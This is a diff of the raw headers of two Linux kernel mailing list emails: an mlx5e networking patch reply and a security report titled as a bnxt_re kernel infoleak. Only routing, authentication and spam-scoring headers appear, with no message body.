@@ -1,292 +1,681 @@
-Return-Path: <linux-rdma+bounces-20239-lists+linux-rdma=lfdr.de@vger.kernel.org>
+Return-Path: <linux-rdma+bounces-20240-lists+linux-rdma=lfdr.de@vger.kernel.org>
 Delivered-To: lists+linux-rdma@lfdr.de
 Received: from mail.lfdr.de
 	by lfdr with LMTP
-	id mHvkL13n/WkPkgAAu9opvQ
-	(envelope-from <linux-rdma+bounces-20239-lists+linux-rdma=lfdr.de@vger.kernel.org>)
-	for <lists+linux-rdma@lfdr.de>; Fri, 08 May 2026 15:38:37 +0200
+	id MMBJEfjq/WkPkwAAu9opvQ
+	(envelope-from <linux-rdma+bounces-20240-lists+linux-rdma=lfdr.de@vger.kernel.org>)
+	for <lists+linux-rdma@lfdr.de>; Fri, 08 May 2026 15:54:00 +0200
 X-Original-To: lists+linux-rdma@lfdr.de
-Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
-	by mail.lfdr.de (Postfix) with ESMTPS id 28AA34F72AA
-	for <lists+linux-rdma@lfdr.de>; Fri, 08 May 2026 15:38:37 +0200 (CEST)
+Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
+	by mail.lfdr.de (Postfix) with ESMTPS id 975004F76C2
+	for <lists+linux-rdma@lfdr.de>; Fri, 08 May 2026 15:53:59 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sea.lore.kernel.org (Postfix) with ESMTP id 433DF309F258
-	for <lists+linux-rdma@lfdr.de>; Fri,  8 May 2026 13:34:09 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id 31A9830DC4FD
+	for <lists+linux-rdma@lfdr.de>; Fri,  8 May 2026 13:45:29 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id D3D103ECBF6;
-	Fri,  8 May 2026 13:31:10 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id C64943E8660;
+	Fri,  8 May 2026 13:45:27 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=Nvidia.com header.i=@Nvidia.com header.b="dSb2hifj"
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="itWqUFJo"
 X-Original-To: linux-rdma@vger.kernel.org
-Received: from CO1PR03CU002.outbound.protection.outlook.com (mail-westus2azon11010025.outbound.protection.outlook.com [52.101.46.25])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pl1-f171.google.com (mail-pl1-f171.google.com [209.85.214.171])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 50EF03F6613;
-	Fri,  8 May 2026 13:31:01 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.101.46.25
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A68043E8C46
+	for <linux-rdma@vger.kernel.org>; Fri,  8 May 2026 13:45:25 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.214.171
 ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1778247068; cv=fail; b=pNKTr1aUfug4CdXDGT7+PTDESeYABELlcA7JWwW9TWOWodmOouR/U/yQELk9uj7pGJlFwNEtcu5BOT1+5wAKfR52mlk336xbFyw+88YA7eap0D9p4Kwnba60eaQiwUmIY8M9kjFxRgAktZ39ywnu/UrAIccEgKJyrCCQdaxlwkE=
+	t=1778247927; cv=pass; b=V12+8d2eP9HxKoCcyT/hrg9d7Pseu9d+5NFH52vN4U1mG39RmWW8hT6J5l0Djf3RyI6TaDq0dnE1RdLXSs4II/CZhxdSsW82s0VaUOR/YrnEaKNIs1hC9/Kq7jdEBsMwqf4ml9AxfqC+vkCEjWACbIetD9DP0fSXRv0k+UTvjR0=
 ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1778247068; c=relaxed/simple;
-	bh=aE0Rg6cc2+xy9fCbT2mSFDoXk4YZ8JmcF3kXA6Cl/kk=;
-	h=Message-ID:Date:Subject:To:Cc:References:From:In-Reply-To:
-	 Content-Type:MIME-Version; b=oDRpBl9jUXHty9c16iImLw0hU9F5TCLa4IIEJ8L2RmTXIlChL7bNkrGBpihhXnpRV21j3tSPRarVXNO023Uqf3UssYLWIW4u6ZrXGL8qSO5VMRJClrRBhgTjlYnwJ2dxCJuTfY8bRQasCFsplxdJzlHo5RuOLQtK1jclLi09l9c=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=nvidia.com; spf=fail smtp.mailfrom=nvidia.com; dkim=pass (2048-bit key) header.d=Nvidia.com header.i=@Nvidia.com header.b=dSb2hifj; arc=fail smtp.client-ip=52.101.46.25
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=nvidia.com
-Authentication-Results: smtp.subspace.kernel.org; spf=fail smtp.mailfrom=nvidia.com
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=AZyKQVdeIfO5fdN+Zn2aAkexvqVZCG+n6KNGgM0Ibq4kolV3fE8daLvXVRy8IpXmBKMOmSdk5WMh9Z22tX3wbYN9li7EXOPV/AOZJole6nYK830QlU27K43cXFApoxBqweo5C+kRgsx0VwMpuhIc4W3AaewEYEDGQC5a+GxN/qNxZbJKUoZZMTbmXXq7kVBhpU3QseotXgyvYbUBZDhKJNqgb49cfmfPdav7yVFp/QuvHjQVhVfSlfJr03A2NUX5UP0xtVHR/sJPr6dZyUagXhrZUphXrKgjdOVblqOZwgq6Y8xhV/8h0rsmrgwVrkXe5cIy4+k3o2JkGOLeBAcyXA==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=6WXLa7xszPrafKb7dVQHEFFYGd6pIR+Hd/OR1Pw6o6c=;
- b=Mo7eb1JFoOVix78N4i4wmzPEw3PZkV9bF80mYooJPlALjnviTe068YwTWlEtbCifJ9DN4b0CeqoHzrYFPvUZp/cxXdhPC5NjJtFKQvGoCkF2ReGj71VPtuvP2YdBaFgZiEr+aaf8f+XkJojSHaQiiJ/cYY6FB6a1x+iwKSKSzIGbXGLwk9Q2jQ3mm8UbI5srIYI0I1GmlOvmshYBH+avsGjvInLB0P8LXnjIqjpT/1i0sqvcl7kyd8bFkwxnd7Vg7Z8r5rGCtqBxcuUGFGDvaP4zCvO78+E/yq7C4aazflercayVD6T1pb69c9XkVzR/U7sko9mqobAQrx0fY8bwsg==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=nvidia.com; dmarc=pass action=none header.from=nvidia.com;
- dkim=pass header.d=nvidia.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=Nvidia.com;
- s=selector2;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=6WXLa7xszPrafKb7dVQHEFFYGd6pIR+Hd/OR1Pw6o6c=;
- b=dSb2hifjDbT8+8sMHsjJvYYBtusp68+HfWYW3Gi6/VuuP8jokmebbbaE3k+gslZgILFxPu0psCDN+lttCfT7jwGI66wzNpVod0wTT2poRM0YyZbSNseLvvpN59s22XMGmx8oFwy8JkyVnO7n6V9qt802TsARrEvLgJqR5lloVXqKCIFE/1J6HDRpB+hOvEB+ymX7mz7/nnUeokhJi7Sic6k2l3z2K7y232wyVHWT2OXdENmR+n32Q9uu1k8/rjSD5nDxApQaHLbXemzIkWcqsbQqvsTXRxJ9jN6W6ALBEiRRs0BcLmCzxklFp6evbF1BHVlPl1Oabn2awVxFIdJ/YQ==
-Authentication-Results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=nvidia.com;
-Received: from CH3PR12MB8728.namprd12.prod.outlook.com (2603:10b6:610:171::12)
- by CYYPR12MB8962.namprd12.prod.outlook.com (2603:10b6:930:c4::13) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9870.25; Fri, 8 May
- 2026 13:30:46 +0000
-Received: from CH3PR12MB8728.namprd12.prod.outlook.com
- ([fe80::2641:1046:bdf3:93d7]) by CH3PR12MB8728.namprd12.prod.outlook.com
- ([fe80::2641:1046:bdf3:93d7%7]) with mapi id 15.20.9891.015; Fri, 8 May 2026
- 13:30:46 +0000
-Message-ID: <ec8e758a-6f03-43af-afa8-31632f18737e@nvidia.com>
-Date: Fri, 8 May 2026 15:30:40 +0200
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH net-next V6 2/3] net/mlx5e: Avoid copying payload to the
- skb's linear part
-To: David Laight <david.laight.linux@gmail.com>,
- Tariq Toukan <tariqt@nvidia.com>
-Cc: Christoph Paasch <cpaasch@openai.com>, Eric Dumazet
- <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>,
- Paolo Abeni <pabeni@redhat.com>, Andrew Lunn <andrew+netdev@lunn.ch>,
- "David S. Miller" <davem@davemloft.net>, Saeed Mahameed <saeedm@nvidia.com>,
- Mark Bloch <mbloch@nvidia.com>, Leon Romanovsky <leon@kernel.org>,
- netdev@vger.kernel.org, linux-rdma@vger.kernel.org,
- linux-kernel@vger.kernel.org, Gal Pressman <gal@nvidia.com>,
- Daniel Borkmann <daniel@iogearbox.net>,
- Jesper Dangaard Brouer <hawk@kernel.org>,
- John Fastabend <john.fastabend@gmail.com>,
- Stanislav Fomichev <sdf@fomichev.me>, Amery Hung <ameryhung@gmail.com>,
- Alexei Starovoitov <ast@kernel.org>
-References: <20260507095330.318892-1-tariqt@nvidia.com>
- <20260507095330.318892-3-tariqt@nvidia.com> <20260508134343.6651d7c6@pumpkin>
-Content-Language: en-US
-From: Dragos Tatulea <dtatulea@nvidia.com>
-In-Reply-To: <20260508134343.6651d7c6@pumpkin>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-X-ClientProxiedBy: FR4P281CA0192.DEUP281.PROD.OUTLOOK.COM
- (2603:10a6:d10:ca::10) To CH3PR12MB8728.namprd12.prod.outlook.com
- (2603:10b6:610:171::12)
+	s=arc-20240116; t=1778247927; c=relaxed/simple;
+	bh=n0YfI3CePSAQZm3dq8GMHosmxX9pzq9XQXc+YaLxbSY=;
+	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=s0hhGxDxDMFAb4GmzKBcVw8IJFqCRFd4+BnnL0nFoIC31ow55VbjnsOyZNJB4lW+P0KzXGjJjziEg/oqjHZCp6dKL3oSQmp4GItmH0kcD4DqmH5+WESmaKO1dd/xG7yLL3YmDY4w5EFfYrUEqLZjtFB+H9LqmPvs+KyCUqEWVpc=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=itWqUFJo; arc=pass smtp.client-ip=209.85.214.171
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+Received: by mail-pl1-f171.google.com with SMTP id d9443c01a7336-2bab2548e8bso9751165ad.0
+        for <linux-rdma@vger.kernel.org>; Fri, 08 May 2026 06:45:25 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1778247925; cv=none;
+        d=google.com; s=arc-20240605;
+        b=E4lH7/U4U/qFDPm2M99kNLa6r3hBaeHAIjU76U8GMt3aBJ1tC3NQ0PlXYroX7bbpqR
+         AFqdccJw8tQlnixJne+Uqge2IH5O8DAZ+bh3eaTB0+4gAXY/CJu9V3Fb7Ph6LMUDMFst
+         j5vPuAP0kGsflHxuLDl/2y8I+wu+9wAfMVczkbhYB55hZV9aty4HHS9eQ1x1d7RsB9ya
+         vCB2DQeMJYZdW1m+kRWrByvpIzXqJVcTD/Jw4WTwEJwisU9R61wvfDjw7f0QVtUg1S74
+         6GwSTMb6oOq8MSTJqPDVQD9If+zRJdLEK2QgdoVIYnftHvPesQ2T8bU78yvS9AhsXSR5
+         yO5A==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :mime-version:dkim-signature;
+        bh=uTpjNJw8k2A4SJTYsMIQXr2B4Y2hKUwXkBVFJJo8JXQ=;
+        fh=VvEGpiJFrwtvv7hu26aI+ifH3cd/pa9pXad3dDKHWpA=;
+        b=LUv2YDYhC9+QgsuxA1o5wskZtn+nD+XIcsQm84m0YYeMdW76YqgmMgrHZKT7w8+3pJ
+         9F8SYtYoSGX3amAdua+MmjVdv4PXup2dbj4BCLXg7I5cE6vli7R6Xq4Bmk8bQ+a5eFiM
+         Xju7veW6+tys7/Ao6eA+IzrEr9JDlu0bW1nYO0Qhw7UFQXydaXliRkDnggdwrt/o1Byc
+         QsigsGM1Rnh+AVxbbncSUT0k4GqApUOBsJ0Rkbjzva8uhpLDn234zLjC1Hqx0TWfYpsM
+         sS00/ewiZf4gSuALSilAQ0o8CdqOsl3pqrGERGbRw96/Ju96aZVqqnSohQBUuUakz7Tf
+         B1lg==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1778247925; x=1778852725; darn=vger.kernel.org;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :mime-version:from:to:cc:subject:date:message-id:reply-to;
+        bh=uTpjNJw8k2A4SJTYsMIQXr2B4Y2hKUwXkBVFJJo8JXQ=;
+        b=itWqUFJoy6XZHvva8W2PvxxSghVSXEn+Ou2DfAcDYflly7GJ6SjuXEd7l/gOxCBQC5
+         zCLRbcvyFFyZjZTOtU18QKCuL6VScuW1VrgIDRmL8ol/MuLLufqNyOKHSiuPMhVw/yUa
+         qHb9TJyqUB9vWtHcGVzDGETINsRgHEWTYUlVsJoaBCntirjTVCX/S1+ojvN7fIXe2SMP
+         WmLPct1xJSl0YYxOXxJ36BIaMsPzCSTFi3qIh+83qj98ar5Hy5MJYPN2E0Fe8C/k/CRw
+         pvNLgpwMGd+nw6QkGqWOVF8rWEi/4PNmiGPMH1I2+sjiz+oFEIupQ/zOmNY9OLLXl9u+
+         f0/w==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1778247925; x=1778852725;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :mime-version:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=uTpjNJw8k2A4SJTYsMIQXr2B4Y2hKUwXkBVFJJo8JXQ=;
+        b=sc+PymmKU4ppX8ZPKG4R+CP/AUerSL0g3geY2Bviq6aJEd6bJbsD+GczOxcleEP7iN
+         8Y8hiXdFbLkU5ZdSisfbEnGsFwhJtCz5yplZsAIwadm/ekdm0xujPBfYDb7cFSavu7pA
+         ruPtGTIyBQXM8f9Aib1zbPVfGP6Pgxbfz6jpYypaY+sGzo5NRHf2kFlsU8edsO6MZ0ny
+         gkt8kK+ukDtA/PcvZm4ol1stXecj20V9nYLPTVOD5acUfbjwKK3A2AK5g0/UVVf7jqEl
+         M0vSBGtkKwX3VBDCXsMTDJBERyXqF8j2NKWTfeW57aYJUmfRlPN9kavtzVlKmEMHUCxe
+         ig1g==
+X-Forwarded-Encrypted: i=1; AFNElJ9cP/N4TP7h4J2EWKjGhUWN55wgtepcgplCMXO3mHBJQqjjEEyFwd+Q77/q9l96j8IMjTEnOCYqrNGu@vger.kernel.org
+X-Gm-Message-State: AOJu0Yw85lhb0uFObBu7XPMfdhiuu3963edYQ3uY9xkRzTNNFUWvbe16
+	i7yXSMmo1PVPhDme6BF+VuPcVjrrjCNQD+jKfW1yH8URUqEaVccxZ+qU3pM9eT03P0nd5p3/27M
+	DjI4q4A1V+8XZvfM+P4ub2tWZW5yrzks=
+X-Gm-Gg: Acq92OHvHcEFUXdL4Q+lBrGgO7gpJ4+uBmwLaVg2SblNDmsJ+pd3plwrNBiD4yP7gA6
+	aGdzrBIbOwO9JoSvP/BY5JG7SVCbPvcJABQuj4xvyaO5UVWbUuS5QcRA9VwiAA918AItDau0s4b
+	gj0BWz2b/9RgJOtqksrIf3VUBwRouAL1vRNydABXUi6Z5X827aYj9q0dVHVJtXWNjk3p2La8vUe
+	SswlYR6sFxo4rF3/p1BWvPE7KC18rLerUfqQGmOrkAZSOMtTSCf25zObxdSobslDWQRggb5RCdW
+	gDRoknC97W4vnm7Sr+pBztQikdaRrHWP6tLpg9feZ6R0PcwebiyIcWIuAcIWsfy7XvU6Hea3FRw
+	uAMdVAkNXCMGlvQ==
+X-Received: by 2002:a17:903:1247:b0:2b0:708f:4dc7 with SMTP id
+ d9443c01a7336-2ba796b2374mr139239385ad.29.1778247924725; Fri, 08 May 2026
+ 06:45:24 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: linux-rdma@vger.kernel.org
 List-Id: <linux-rdma.vger.kernel.org>
 List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-MS-PublicTrafficType: Email
-X-MS-TrafficTypeDiagnostic: CH3PR12MB8728:EE_|CYYPR12MB8962:EE_
-X-MS-Office365-Filtering-Correlation-Id: dc84dddc-f3a1-45f8-f041-08dead0602be
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam:
-	BCL:0;ARA:13230040|1800799024|7416014|366016|376014|22082099003|3023799003|56012099003|18002099003;
-X-Microsoft-Antispam-Message-Info:
-	mO4WspaQLpXTVuzHc1Jlv+031r0qNSVCUJAIStsN9anHNU13gVgvFOJgaOH7PIhqIf6gyMMp4V8IdAq5CqdQ37ieW8rDS8LZ6G4Yya+EtLkNLeWjDzbbpNlWgbolnCOL+uspKYiIwKGVHRsDoaU2BspVGcjCCeCEJPMy3HmNBwMm7vEZlXLcnetfzI1p/dS907zjQNn69uvMuCfgaJ6SC+eOvb89driHMFLT0CGarlz+bQ8sksnb/kZS1h3wnyoazeT5AL4fno64TTe/jJFcpuT/COIbdnqGtH8TOQ6IW3gmuQfBEEOkPelfkR2Ftb9/fz75vuvOlIez10NaKsb0Dv4DqyHCkYF7sNkxSKMoStN7h0cPSGEVYA9UoV/FkA8AfoDCDAK3EiPS4+I7PMFH+xbMn5PGTF2It20vxBCc2LzHZ1ToNjxeN0yxu9UJsQ4E5pZRDyAl5sJNBcVjdjVI06ug1bItlyNOnwYM/EwqnN46heBjhfYUt12aa0cPFDJKKGlff4r1JueRclYfEGPcUIhKvkhE1Th2qV6lzetn7FoiX11BB7GJ9nj+zdXZL7kyyVuWBfMmHry+yjrEtSTZj5U5zD/oECHNrMF+zb5BkOkhOB96FY/GMQrx0itLJT6cxDbjvp3oczi2L1CuNyhrJEqOu5kIfKtLjbwJlIYpoCZJgtBLVjn/F4+UhWQUAnnT
-X-Forefront-Antispam-Report:
-	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:CH3PR12MB8728.namprd12.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(7416014)(366016)(376014)(22082099003)(3023799003)(56012099003)(18002099003);DIR:OUT;SFP:1101;
-X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
-X-MS-Exchange-AntiSpam-MessageData-0:
-	=?utf-8?B?RzRYVW8xMnlDcUdkbkxPeVZuRGZCWWpYS2xpeWY3VEptOC9mYU9Rd1ZXRUcr?=
- =?utf-8?B?aE02ZHAzK091UGduOVFhNkUyU25ZdmNYemR3ZURLMWVUMDRJMzEzK2NPb3Zr?=
- =?utf-8?B?NW54RWxRbzdITFBzN0JKME9TeGFxQW5TNGRqdDAxamVNL21mT29heXVmUU1I?=
- =?utf-8?B?MzFVRjE5YnRnUEhRajBKQmN1ai9xYmVRamk3K2NSSHZocjJCcTNDSlpLVkN2?=
- =?utf-8?B?dytoVCswakNTZTlDclV3TlczVWRTOWFQWkc4bGFsWTNYdjF4RmJZUzY1UVNq?=
- =?utf-8?B?RFM3Nm1OV0tlbDhhYW81c1dnU1pNSkxzcjI3RGtDTE9xU0tNRkNFcVNtNWR3?=
- =?utf-8?B?MVpkMzhnK2pIZW9KSzBxSDhHUXhGOWhaYWRMZEJrWSt3blY0R1I2T0M2Nmpj?=
- =?utf-8?B?Qjc0ZXBlRHN0Z3NIeVEwRmN3QXBKMG1sOUEzb05aOU1VSEZrOEZ2Y1RqOVV6?=
- =?utf-8?B?bW1wUUlmZUl6OTF4ZWxzaU8raGhNbEtTV2J4UXRoTjF0OGJCaTJSa0NpeHpJ?=
- =?utf-8?B?NjNVZTdQc2RCZFMvZEluaWdFYzVmZnBpZ3QrNENQRUNlY2dLS0p3TDJmRi9j?=
- =?utf-8?B?SjNKNE93N1NJZXRXVHF2d2VTZ1dZaURoUTBnM05CQmdCN3Z0ckdFTWRGSC9V?=
- =?utf-8?B?OVlLWFdYa1VzcGVPYXZyeGZlT0ExdDN3UGNWU2lHNC9MbkliMUt1bmVqZ3d4?=
- =?utf-8?B?OUlYSDBGZnMyN1kxOGRGdnFvdU8wb0ZvM01FK3VSNUdYenNCeDRVcElya1M5?=
- =?utf-8?B?TjAvMUVTek5ib24xMmNPMU1yUm5ncWREZGxRQ3orTzVqN29YR2JWSCt4Vnhj?=
- =?utf-8?B?alJRU1gyb1ZGbWNuM1BieTVLdlJqUWl5RjB6TDkvUGZOSnBSZnlGak0rUzIy?=
- =?utf-8?B?YlorYzFyMnp4QkVvU2ozTVZLUmphV1NHdzZraWRsR2FISDhoK3FFanI2VFpz?=
- =?utf-8?B?SVFHRVFWUDhjWnNPRjR5bkdpdndTb3dDSEVYMElyUVR3UVdJanUySVVaRmxr?=
- =?utf-8?B?N1hVdGRmbndzK1dhb0tsdXYzYWx0Tlp2YnMrdmUzelJ6enZKRFJzL0RsdnBv?=
- =?utf-8?B?c1h2eU5yMzd6YWNJSEU5SUxPcDI5NmUrVU9vV0trSUhVOUJkZ0QxV3RSVlRu?=
- =?utf-8?B?cDRRYStWRm9CY0Q4SW0raXVPWWhYYU1MdXdwTDh2c2JZQXdTQjhSOEpFR1Ev?=
- =?utf-8?B?UzBmSmVMdDlOdll2T2trdDdSQjdSQTZvTE15YXhqZzBqZXQwWkV6b0dBbDJQ?=
- =?utf-8?B?Z1hQRU9HTkkrSDZPZzMxakJ1enlTM0hOUkg4OStrd1NqS3E1cWZOT2s5czZj?=
- =?utf-8?B?N2Q4blFMc1RzUzVjMUd2WmZabTNxdmIvbHRDT0NpdEpBNFZLK2xJNzFCWks3?=
- =?utf-8?B?RVFQTHhyZ0loMkQ2THFwZUlnbVMxbXdCa0VpekVIN2JHZGJUWWVsNkNSUlNa?=
- =?utf-8?B?RGhtWk8rTHo3LzZyTk52Z056M2dEODJIZ3huWDBCOXhmV1VOdHFSOXI2c1ZS?=
- =?utf-8?B?Tkw3RklNOWE3WGI0enFYQVAweGtuMHo0UEpzV1hneDJKL3dOQ2dpQzdBSzk3?=
- =?utf-8?B?N2tHUWQ4NVNrdlQzMVBPSkdzVHNEVU8rcDNXRktLVkhnTEpLVW5DY1FEZmkw?=
- =?utf-8?B?dUFwdEFNN1BrMmRVK0svS2kxR3Jwb1VtR1BodUFVR2VxNDR1VzNNMjA4eEth?=
- =?utf-8?B?ZzQ4NXVra3JIZGppTnM5ZHBCaFpVWlhVUFBwQ3AvYWJNSHJoeVkzNlAxcW5p?=
- =?utf-8?B?d01wRkJCK0dJSE9pRHZXYmZnay9yVkFjWS9pR2VuazdjY2l4ZFVSTW1UblJT?=
- =?utf-8?B?RXp0WjBDaWxhSGp3M09pYkxmdlhYV2l5OUJzYmJRVUN2cVFNQ0UvdDlrdVRG?=
- =?utf-8?B?M1hSTytJZ0xPaG03akVtQk1UTTBZS2pzdUVJalFkOW1QOTJkTDh3KzlOMmRl?=
- =?utf-8?B?TFZwdzJKdlk5RERoTVc4U1JFaVNVK2g3WlNGaGtmUFJORGFJTGMxOUZYYjJv?=
- =?utf-8?B?Y1BHY3FPS0ptOTFsc1VHbzZ3b3ZMN25TTy9EaTNZMGVvZ2pFSGs1RGw4Q2Ji?=
- =?utf-8?B?VUxLMkdUNjVnZ3VhMnRsTHd5Ny9tWEJLdzVDQ1BkeGpuR1dkZnE2Uk5KYWIy?=
- =?utf-8?B?eDUrWVlTWnhZTVFXS0NLRXRrYkxCcDYva3gxNTNJOHJzR2lXRlFzVzFEYlZ0?=
- =?utf-8?B?S0pneG8zOTV3ZnJqTldyRjh1dDJVdy9ZdlB6cEVtejJZK085bTkwUnNNYTRX?=
- =?utf-8?B?Y1RxRGNVbTh1OWdya1NxZzIyNHJVRm5rV3VnQmdKYmZJSjgyMXYyc0pJUndX?=
- =?utf-8?B?ZjJiQkFNOUZHUXJEeHdPVElzRVVkbG5Ucmw2elVvYnQ2d25aQzEzQT09?=
-X-OriginatorOrg: Nvidia.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: dc84dddc-f3a1-45f8-f041-08dead0602be
-X-MS-Exchange-CrossTenant-AuthSource: CH3PR12MB8728.namprd12.prod.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 08 May 2026 13:30:46.3878
- (UTC)
-X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
-X-MS-Exchange-CrossTenant-Id: 43083d15-7273-40c1-b7db-39efd9ccc17a
-X-MS-Exchange-CrossTenant-MailboxType: HOSTED
-X-MS-Exchange-CrossTenant-UserPrincipalName: HiG3KZAepBONYTZCYxFgByZjrMfNCDClqfzFoII4hTuJFdWdwAVvNMthOEJnZy+nNyWEVxUlAOFs92dbrwd83w==
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: CYYPR12MB8962
-X-Rspamd-Queue-Id: 28AA34F72AA
+From: Henrik Holmberg <pomzm67@gmail.com>
+Date: Fri, 8 May 2026 15:45:13 +0200
+X-Gm-Features: AVHnY4Kc-dgIuD-Rsbaa-X5aRTfqDmHnxaVZDwLsTGCwWx5MWwG-YT7PFRxiuKY
+Message-ID: <CAOOd5ej7=KFT8+JO8D3g=QnnhJR2+V--a+JSKcpuxUt=tyGyZw@mail.gmail.com>
+Subject: [security] RDMA/bnxt_re: kernel infoleak via uninitialised shpg
+ shared page exposed to userspace
+To: security@kernel.org
+Cc: selvin.xavier@broadcom.com, kalesh-anakkur.purayil@broadcom.com, 
+	linux-rdma@vger.kernel.org
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 975004F76C2
 X-Rspamd-Server: lfdr
-X-Spamd-Result: default: False [1.34 / 15.00];
-	SUSPICIOUS_RECIPS(1.50)[];
-	ARC_REJECT(1.00)[cv is fail on i=2];
-	DMARC_POLICY_ALLOW(-0.50)[nvidia.com,reject];
-	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
-	R_DKIM_ALLOW(-0.20)[Nvidia.com:s=selector2];
+X-Spamd-Result: default: False [-2.16 / 15.00];
+	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
+	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
+	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64:c];
+	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
 	MAILLIST(-0.15)[generic];
 	MIME_GOOD(-0.10)[text/plain];
 	HAS_LIST_UNSUB(-0.01)[];
-	FORGED_SENDER_MAILLIST(0.00)[];
-	MIME_TRACE(0.00)[0:+];
-	FREEMAIL_TO(0.00)[gmail.com,nvidia.com];
-	TAGGED_FROM(0.00)[bounces-20239-lists,linux-rdma=lfdr.de];
-	FREEMAIL_CC(0.00)[openai.com,google.com,kernel.org,redhat.com,lunn.ch,davemloft.net,nvidia.com,vger.kernel.org,iogearbox.net,gmail.com,fomichev.me];
-	RCVD_TLS_LAST(0.00)[];
-	FROM_HAS_DN(0.00)[];
 	FORGED_RECIPIENTS_MAILLIST(0.00)[];
-	RCPT_COUNT_TWELVE(0.00)[21];
-	RCVD_COUNT_FIVE(0.00)[5];
+	TAGGED_FROM(0.00)[bounces-20240-lists,linux-rdma=lfdr.de];
+	FROM_HAS_DN(0.00)[];
+	RCVD_COUNT_THREE(0.00)[4];
+	RCVD_TLS_LAST(0.00)[];
+	MIME_TRACE(0.00)[0:+];
+	FORGED_SENDER_MAILLIST(0.00)[];
+	DKIM_TRACE(0.00)[gmail.com:+];
+	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
+	MISSING_XM_UA(0.00)[];
+	TO_DN_NONE(0.00)[];
 	PRECEDENCE_BULK(0.00)[];
